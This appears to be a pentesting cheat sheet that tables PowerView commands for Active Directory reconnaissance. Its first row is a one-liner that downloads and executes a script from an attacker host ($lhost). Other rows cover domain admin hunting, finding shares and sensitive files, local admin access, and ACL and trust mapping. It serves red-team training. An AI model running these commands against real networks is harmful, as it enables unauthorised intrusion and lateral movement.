# PowerView

| Info                                                                                  | Command                                                                                                                     |
| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Download & Import PowerView                                                           | `iex(new-object net.webclient).downloadstring('http://$lhost/windows/privesc/PowerView.ps1');Import-Module .\PowerView.ps1` |
| Get Domain                                                                            | `Get-NetDomain`                                                                                                             |
| Get object of another domain                                                          | `Get-NetDomain -Domain domain.local`                                                                                        |
| Get domain SID for the current domain                                                 | `Get-DomainSID`                                                                                                             |
| Get domain policy for the current domain                                              | `(Get-DomainPolicy)."System Access"`                                                                                        |
| Get kerberos policy for the current domain                                            | `(Get-DomainPolicy)."Kerberos Access"`                                                                                      |
| Get domain policy for the another domain                                              | `(Get-DomainPolicy -domain domain.local)."System Access"`                                                                   |
| Get Domain controllers for the current domain                                         | `Get-NetDomainController`                                                                                                   |
| Get Domain controllers for another domain                                             | `Get-NetDomainController -Domain domain.local`                                                                              |
| Get a list of users in the current domain                                             | `Get-NetUser`                                                                                                               |
| Get list of properties for all users in the current domain                            | `Get-UserProperty`                                                                                                          |
| Get User description                                                                  | `Find-UserField -SearchField Description -SearchTerm "built"`                                                               |
| Get a list of computers in the current domain                                         | `Get-NetComputer`                                                                                                           |
| Get a list of computers in the current domain                                         | `Get-NetComputer -OperatingSystem "*Server 2016*"`                                                                          |
| Get a list of computers in the current domain                                         | `Get-NetComputer -Ping`                                                                                                     |
| Get a list of computers in the current domain                                         | `Get-NetComputer -FullData`                                                                                                 |
| Get all the groups in the current domain                                              | `Get-NetGroup`                                                                                                              |
| Get all the groups in the current domain                                              | `Get-NetGroup -Domain domain.local`                                                                                         |
| Get all the groups in the current domain                                              | `Get-NetGroup -FullData`                                                                                                    |
| Get all the groups in the current domain                                              | `Get-NetGroup -FullData`                                                                                                    |
| Get all the members of the Domain Admins group                                        | `Get-NetGroupMember -GroupName "Domain Admins" -Recurse`                                                                    |
| Get the group memberships for a user                                                  | `Get-NetGroup -UserName "user1"`                                                                                            |
| List all the local groups on a machine (needs admin on non-dc machines)               | `Get-NetLocalGroup -ComputerName computer1.domain.local -ListGroups`                                                        |
| Get members of all the local groups on a machine (needs admin on non-dc machines)     | `Get-NetLocalGroup -ComputerName computer1.domain.local -Recurse`                                                           |
| Get actively logged on users on computer (needs local admin)                          | `Get-NetLoggedOn -ComputerName computer1`                                                                                   |
| Get locally logged on users on a computer (needs remote registry)                     | `Get-LoggedonLocal -Computer computer1.domain.local`                                                                        |
| Get the last logged on user on a computter (needs admin & remote registry)            | `Get-LastLoggedOn -ComputerName computer1.domain.local`                                                                     |
| Find shares on hosts siin current domain                                              | `Invoke-ShareFinder -Verbose`                                                                                               |
| Find sensitive files on computers in the domain                                       | `Invoke-FileFinder -Verbose`                                                                                                |
| Get all fileservers of the domain                                                     | `Get-NetFileServer`                                                                                                         |
| Get list of GPO in current domain                                                     | `Get-NetGPO`                                                                                                                |
| Get list of GPO in current domain                                                     | `Get-NetGPO -All`                                                                                                           |
| Get list of GPO in current domain                                                     | `Get-GPO -All`                                                                                                              |
| Get GPOs which use restricted groups of groups.xml for interesting users              | `Get-NetGPOGroup`                                                                                                           |
| Find users which are in a local group of a machine using GPO                          | `Find-GPOComputerAdmin -Computername computer1.domain.local`                                                                |
| Get machines where the given user is member of a specific group                       | `Find-GPOLocation -UserName user1 -Verbose`                                                                                 |
| Get OUs in a domain                                                                   | `Get-NetOU -FullData`                                                                                                       |
| Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU           | `Get-NetGPO -GPOName "{AB306569-220D-43FF-B03B}"`                                                                           |
| Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU           | `Get-GPO -Guid AB306569-220D-43FF-B03B`                                                                                     |
| Get the ACLs associated with the specific object                                      | `Get-ObjectACL -SamAccountName user1 -ResolveGUIDs`                                                                         |
| Get the ACLs associated with the specific prefix to be used for search                | `Get-ObjectAcl -ADSprefix 'CN=Administrators,CN=Users' -Verbose`                                                            |
| Get the ACLs associated with the specified LDAP path to be used for search            | `Get-ObjectACL -ADSpath 'LDAP://CN=Domain AdminsCN=Users,DC=domain,DC=local' -ResolveGUIs -Verbose`                         |
| Search for interesting ACEs                                                           | `Invoke-ACLScanner -ResolveGUIDs`                                                                                           |
| Get the ACLs associated with the specified path                                       | `Get-PathAcl -Path '\\domain.local\sysvol'`                                                                                 |
| Get a list of all domain trusts for the current domain                                | `Get-NetDomainTrust`                                                                                                        |
| Get a list of all domain trusts for the current domain                                | `Get-NetDomainTrust -Domain domain.local`                                                                                   |
| Get details about the current forest                                                  | `Get-NetForest`                                                                                                             |
| Get details about the current forest                                                  | `Get-NetForest -Forest domain.local`                                                                                        |
| Get all domains in the current forest                                                 | `Get-NetForestDomain`                                                                                                       |
| Get all domains in the current forest                                                 | `Get-NetForestDomain -Forest domain.local`                                                                                  |
| Get all global catalogs for the current forest                                        | `Get-NetForestCatalog`                                                                                                      |
| Get all global catalogs for the current forest                                        | `Get-NetForestCatalog -Forest domain.local`                                                                                 |
| Map trusts of a forest                                                                | `Get-NetForestTrust`                                                                                                        |
| Map trusts of a forest                                                                | `Get-NetForestTrust -Forest domain.local`                                                                                   |
| Find all machines on the current domain where the current user has local admin access | `Find-LocalAdminAccess`                                                                                                     |
| Find local admins on all machines of tthe domain                                      | `Invoke-EnumerateLocalAdmin -Verbose`                                                                                       |
| Find computers where a domain admin is logged in                                      | `Invoke-UserHunter -Stealth`                                                                                                |
